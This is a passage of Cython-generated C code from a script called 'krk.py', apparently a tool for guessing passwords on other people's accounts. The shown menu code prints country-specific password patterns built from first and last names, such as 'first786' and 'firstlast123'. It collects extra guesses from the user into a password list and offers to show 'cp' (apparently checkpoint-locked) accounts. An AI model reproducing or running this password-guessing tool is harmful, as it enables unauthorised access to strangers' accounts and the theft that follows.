            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
              __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
              if (likely(__pyx_t_5)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_5);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_6, function);
                __pyx_t_7 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[1] = {__pyx_t_5, };
              __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 117, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "krk.py":118
 *                                         print(' \033[1;32mWorking password for Pakistan\033[1;37m ')
 *                                         linex()
 *                                         print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first1234\n [5] first786\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         print('\033[1;32m Out of Pakistan working password\033[1;37m ')
 */
            __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__13, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 118, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "krk.py":119
 *                                         linex()
 *                                         print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first1234\n [5] first786\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')
 *                                         linex()             # <<<<<<<<<<<<<<
 *                                         print('\033[1;32m Out of Pakistan working password\033[1;37m ')
 *                                         linex()
 */
            __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_linex); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 119, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_5 = NULL;
            __pyx_t_7 = 0;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
              __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
              if (likely(__pyx_t_5)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_5);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_6, function);
                __pyx_t_7 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[1] = {__pyx_t_5, };
              __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 119, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "krk.py":120
 *                                         print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first1234\n [5] first786\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')
 *                                         linex()
 *                                         print('\033[1;32m Out of Pakistan working password\033[1;37m ')             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         print(' [1] first last\n [2] firstlast\n [3] first1234\n [4] First Last\n [5] first123 ')
 */
            __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__14, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 120, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "krk.py":121
 *                                         linex()
 *                                         print('\033[1;32m Out of Pakistan working password\033[1;37m ')
 *                                         linex()             # <<<<<<<<<<<<<<
 *                                         print(' [1] first last\n [2] firstlast\n [3] first1234\n [4] First Last\n [5] first123 ')
 *                                         linex()
 */
            __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_linex); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 121, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_5 = NULL;
            __pyx_t_7 = 0;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
              __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
              if (likely(__pyx_t_5)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_5);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_6, function);
                __pyx_t_7 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[1] = {__pyx_t_5, };
              __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 121, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "krk.py":122
 *                                         print('\033[1;32m Out of Pakistan working password\033[1;37m ')
 *                                         linex()
 *                                         print(' [1] first last\n [2] firstlast\n [3] first1234\n [4] First Last\n [5] first123 ')             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         print(' \033[1;32mfor new ids use just 1 password \033[1;37m \n [1] first last > best results \n \033[1;32melse\033[1;37m \n [1] first last\n [2] firstlast\n [3] First Last\n [4] First Last')
 */
            __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__15, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 122, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "krk.py":123
 *                                         linex()
 *                                         print(' [1] first last\n [2] firstlast\n [3] first1234\n [4] First Last\n [5] first123 ')
 *                                         linex()             # <<<<<<<<<<<<<<
 *                                         print(' \033[1;32mfor new ids use just 1 password \033[1;37m \n [1] first last > best results \n \033[1;32melse\033[1;37m \n [1] first last\n [2] firstlast\n [3] First Last\n [4] First Last')
 *                                         linex()
 */
            __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_linex); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 123, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_5 = NULL;
            __pyx_t_7 = 0;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
              __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
              if (likely(__pyx_t_5)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_5);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_6, function);
                __pyx_t_7 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[1] = {__pyx_t_5, };
              __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 123, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "krk.py":124
 *                                         print(' [1] first last\n [2] firstlast\n [3] first1234\n [4] First Last\n [5] first123 ')
 *                                         linex()
 *                                         print(' \033[1;32mfor new ids use just 1 password \033[1;37m \n [1] first last > best results \n \033[1;32melse\033[1;37m \n [1] first last\n [2] firstlast\n [3] First Last\n [4] First Last')             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         input(' Press enter to back menu ')
 */
            __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__16, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 124, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "krk.py":125
 *                                         linex()
 *                                         print(' \033[1;32mfor new ids use just 1 password \033[1;37m \n [1] first last > best results \n \033[1;32melse\033[1;37m \n [1] first last\n [2] firstlast\n [3] First Last\n [4] First Last')
 *                                         linex()             # <<<<<<<<<<<<<<
 *                                         input(' Press enter to back menu ')
 *                                         menu()
 */
            __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_linex); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 125, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_5 = NULL;
            __pyx_t_7 = 0;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
              __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
              if (likely(__pyx_t_5)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_5);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_6, function);
                __pyx_t_7 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[1] = {__pyx_t_5, };
              __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 125, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "krk.py":126
 *                                         print(' \033[1;32mfor new ids use just 1 password \033[1;37m \n [1] first last > best results \n \033[1;32melse\033[1;37m \n [1] first last\n [2] firstlast\n [3] First Last\n [4] First Last')
 *                                         linex()
 *                                         input(' Press enter to back menu ')             # <<<<<<<<<<<<<<
 *                                         menu()
 *                                 else:
 */
            __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__17, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 126, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "krk.py":127
 *                                         linex()
 *                                         input(' Press enter to back menu ')
 *                                         menu()             # <<<<<<<<<<<<<<
 *                                 else:
 *                                         try:
 */
            __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_menu); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 127, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_5 = NULL;
            __pyx_t_7 = 0;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
              __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
              if (likely(__pyx_t_5)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_5);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_6, function);
                __pyx_t_7 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[1] = {__pyx_t_5, };
              __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 127, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "krk.py":114
 *                                         plist.append('firstlast123')
 *                                         plist.append('afghan12345')
 *                                 elif ppp in ['3','03']:             # <<<<<<<<<<<<<<
 *                                         clear()
 *                                         print(' \033[1;32mWorking password for Pakistan\033[1;37m ')
 */
            goto __pyx_L21;
          }

          /* "krk.py":129
 *                                         menu()
 *                                 else:
 *                                         try:             # <<<<<<<<<<<<<<
 *                                                 linex()
 *                                                 ps_limit = int(input(' How many passwords do you want to add ? '))
 */
          /*else*/ {
            {
              __Pyx_PyThreadState_declare
              __Pyx_PyThreadState_assign
              __Pyx_ExceptionSave(&__pyx_t_12, &__pyx_t_11, &__pyx_t_10);
              __Pyx_XGOTREF(__pyx_t_12);
              __Pyx_XGOTREF(__pyx_t_11);
              __Pyx_XGOTREF(__pyx_t_10);
              /*try:*/ {

                /* "krk.py":130
 *                                 else:
 *                                         try:
 *                                                 linex()             # <<<<<<<<<<<<<<
 *                                                 ps_limit = int(input(' How many passwords do you want to add ? '))
 *                                         except:
 */
                __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_linex); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 130, __pyx_L26_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_5 = NULL;
                __pyx_t_7 = 0;
                if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
                  __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
                  if (likely(__pyx_t_5)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                    __Pyx_INCREF(__pyx_t_5);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_6, function);
                    __pyx_t_7 = 1;
                  }
                }
                {
                  PyObject *__pyx_callargs[1] = {__pyx_t_5, };
                  __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
                  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 130, __pyx_L26_error)
                  __Pyx_GOTREF(__pyx_t_4);
                  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                }
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

                /* "krk.py":131
 *                                         try:
 *                                                 linex()
 *                                                 ps_limit = int(input(' How many passwords do you want to add ? '))             # <<<<<<<<<<<<<<
 *                                         except:
 *                                                 ps_limit =1
 */
                __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__18, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 131, __pyx_L26_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_6 = __Pyx_PyNumber_Int(__pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 131, __pyx_L26_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __pyx_v_ps_limit = __pyx_t_6;
                __pyx_t_6 = 0;

                /* "krk.py":129
 *                                         menu()
 *                                 else:
 *                                         try:             # <<<<<<<<<<<<<<
 *                                                 linex()
 *                                                 ps_limit = int(input(' How many passwords do you want to add ? '))
 */
              }
              __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
              __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              goto __pyx_L31_try_end;
              __pyx_L26_error:;
              __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
              __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
              __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

              /* "krk.py":132
 *                                                 linex()
 *                                                 ps_limit = int(input(' How many passwords do you want to add ? '))
 *                                         except:             # <<<<<<<<<<<<<<
 *                                                 ps_limit =1
 *                                         linex()
 */
              /*except:*/ {
                __Pyx_AddTraceback("krk.menu", __pyx_clineno, __pyx_lineno, __pyx_filename);
                if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_4, &__pyx_t_5) < 0) __PYX_ERR(0, 132, __pyx_L28_except_error)
                __Pyx_XGOTREF(__pyx_t_6);
                __Pyx_XGOTREF(__pyx_t_4);
                __Pyx_XGOTREF(__pyx_t_5);

                /* "krk.py":133
 *                                                 ps_limit = int(input(' How many passwords do you want to add ? '))
 *                                         except:
 *                                                 ps_limit =1             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         print('\033[1;32m exp: first123 last123 firstlast ')
 */
                __Pyx_INCREF(__pyx_int_1);
                __Pyx_XDECREF_SET(__pyx_v_ps_limit, __pyx_int_1);
                __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                goto __pyx_L27_exception_handled;
              }

              /* "krk.py":129
 *                                         menu()
 *                                 else:
 *                                         try:             # <<<<<<<<<<<<<<
 *                                                 linex()
 *                                                 ps_limit = int(input(' How many passwords do you want to add ? '))
 */
              __pyx_L28_except_error:;
              __Pyx_XGIVEREF(__pyx_t_12);
              __Pyx_XGIVEREF(__pyx_t_11);
              __Pyx_XGIVEREF(__pyx_t_10);
              __Pyx_ExceptionReset(__pyx_t_12, __pyx_t_11, __pyx_t_10);
              goto __pyx_L3_error;
              __pyx_L27_exception_handled:;
              __Pyx_XGIVEREF(__pyx_t_12);
              __Pyx_XGIVEREF(__pyx_t_11);
              __Pyx_XGIVEREF(__pyx_t_10);
              __Pyx_ExceptionReset(__pyx_t_12, __pyx_t_11, __pyx_t_10);
              __pyx_L31_try_end:;
            }

            /* "krk.py":134
 *                                         except:
 *                                                 ps_limit =1
 *                                         linex()             # <<<<<<<<<<<<<<
 *                                         print('\033[1;32m exp: first123 last123 firstlast ')
 *                                         linex()
 */
            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_linex); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 134, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_6 = NULL;
            __pyx_t_7 = 0;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
              __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
              if (likely(__pyx_t_6)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_4, function);
                __pyx_t_7 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[1] = {__pyx_t_6, };
              __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 134, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_5);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "krk.py":135
 *                                                 ps_limit =1
 *                                         linex()
 *                                         print('\033[1;32m exp: first123 last123 firstlast ')             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         for i in range(ps_limit):
 */
            __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__19, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 135, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "krk.py":136
 *                                         linex()
 *                                         print('\033[1;32m exp: first123 last123 firstlast ')
 *                                         linex()             # <<<<<<<<<<<<<<
 *                                         for i in range(ps_limit):
 *                                                 plist.append(input(f' Put password {i+1}: '))
 */
            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_linex); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 136, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_6 = NULL;
            __pyx_t_7 = 0;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
              __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
              if (likely(__pyx_t_6)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_4, function);
                __pyx_t_7 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[1] = {__pyx_t_6, };
              __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 136, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_5);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "krk.py":137
 *                                         print('\033[1;32m exp: first123 last123 firstlast ')
 *                                         linex()
 *                                         for i in range(ps_limit):             # <<<<<<<<<<<<<<
 *                                                 plist.append(input(f' Put password {i+1}: '))
 *                                 linex()
 */
            __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_v_ps_limit); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 137, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            if (likely(PyList_CheckExact(__pyx_t_5)) || PyTuple_CheckExact(__pyx_t_5)) {
              __pyx_t_4 = __pyx_t_5; __Pyx_INCREF(__pyx_t_4); __pyx_t_17 = 0;
              __pyx_t_18 = NULL;
            } else {
              __pyx_t_17 = -1; __pyx_t_4 = PyObject_GetIter(__pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 137, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_18 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_4); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 137, __pyx_L3_error)
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            for (;;) {
              if (likely(!__pyx_t_18)) {
                if (likely(PyList_CheckExact(__pyx_t_4))) {
                  if (__pyx_t_17 >= PyList_GET_SIZE(__pyx_t_4)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_5 = PyList_GET_ITEM(__pyx_t_4, __pyx_t_17); __Pyx_INCREF(__pyx_t_5); __pyx_t_17++; if (unlikely((0 < 0))) __PYX_ERR(0, 137, __pyx_L3_error)
                  #else
                  __pyx_t_5 = PySequence_ITEM(__pyx_t_4, __pyx_t_17); __pyx_t_17++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 137, __pyx_L3_error)
                  __Pyx_GOTREF(__pyx_t_5);
                  #endif
                } else {
                  if (__pyx_t_17 >= PyTuple_GET_SIZE(__pyx_t_4)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_5 = PyTuple_GET_ITEM(__pyx_t_4, __pyx_t_17); __Pyx_INCREF(__pyx_t_5); __pyx_t_17++; if (unlikely((0 < 0))) __PYX_ERR(0, 137, __pyx_L3_error)
                  #else
                  __pyx_t_5 = PySequence_ITEM(__pyx_t_4, __pyx_t_17); __pyx_t_17++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 137, __pyx_L3_error)
                  __Pyx_GOTREF(__pyx_t_5);
                  #endif
                }
              } else {
                __pyx_t_5 = __pyx_t_18(__pyx_t_4);
                if (unlikely(!__pyx_t_5)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 137, __pyx_L3_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_5);
              }
              __Pyx_XDECREF_SET(__pyx_v_i, __pyx_t_5);
              __pyx_t_5 = 0;

              /* "krk.py":138
 *                                         linex()
 *                                         for i in range(ps_limit):
 *                                                 plist.append(input(f' Put password {i+1}: '))             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 print(' Do you went show cp account? (y/n): ')
 */
              __pyx_t_5 = PyTuple_New(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 138, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_19 = 0;
              __pyx_t_20 = 127;
              __Pyx_INCREF(__pyx_kp_u_Put_password);
              __pyx_t_19 += 14;
              __Pyx_GIVEREF(__pyx_kp_u_Put_password);
              PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u_Put_password);
              __pyx_t_6 = __Pyx_PyInt_AddObjC(__pyx_v_i, __pyx_int_1, 1, 0, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 138, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_13 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 138, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_13);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              __pyx_t_20 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_13) > __pyx_t_20) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_13) : __pyx_t_20;
              __pyx_t_19 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_13);
              __Pyx_GIVEREF(__pyx_t_13);
              PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_13);
              __pyx_t_13 = 0;
              __Pyx_INCREF(__pyx_kp_u__20);
              __pyx_t_19 += 2;
              __Pyx_GIVEREF(__pyx_kp_u__20);
              PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u__20);
              __pyx_t_13 = __Pyx_PyUnicode_Join(__pyx_t_5, 3, __pyx_t_19, __pyx_t_20); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 138, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_13);
              __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
              __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_13); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 138, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_5);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_plist, __pyx_t_5); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 138, __pyx_L3_error)
              __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

              /* "krk.py":137
 *                                         print('\033[1;32m exp: first123 last123 firstlast ')
 *                                         linex()
 *                                         for i in range(ps_limit):             # <<<<<<<<<<<<<<
 *                                                 plist.append(input(f' Put password {i+1}: '))
 *                                 linex()
 */
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          }
          __pyx_L21:;

          /* "krk.py":139
 *                                         for i in range(ps_limit):
 *                                                 plist.append(input(f' Put password {i+1}: '))
 *                                 linex()             # <<<<<<<<<<<<<<
 *                                 print(' Do you went show cp account? (y/n): ')
 *                                 linex()
 */
          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_linex); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 139, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_13 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
            __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_5);
            if (likely(__pyx_t_13)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
              __Pyx_INCREF(__pyx_t_13);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_5, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_13, };
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 139, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          }
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "krk.py":140
 *                                                 plist.append(input(f' Put password {i+1}: '))
 *                                 linex()
 *                                 print(' Do you went show cp account? (y/n): ')             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 cx=input(' Choose: ')
 */
